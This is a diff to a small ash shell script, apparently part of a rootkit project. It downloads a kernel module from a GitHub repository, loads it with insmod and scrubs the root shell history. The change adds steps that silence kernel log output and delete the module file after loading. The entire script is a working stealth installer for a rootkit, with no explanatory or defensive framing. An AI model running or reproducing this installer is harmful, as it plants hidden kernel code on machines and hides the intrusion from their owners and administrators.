@@ -1,6 +1,7 @@
 #!/bin/ash
-echo "4 4 4 4" > /proc/sys/kernel/printk
+echo "0 0 0 0" > /proc/sys/kernel/printk
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/cameleon_ultimate.ko
 insmod cameleon_ultimate.ko
+rm cameleon_ultimate.ko
 sed -i '/cameleon_ultimate/d' /root/.ash_history
 sed -i '/insertion/d' /root/.ash_history
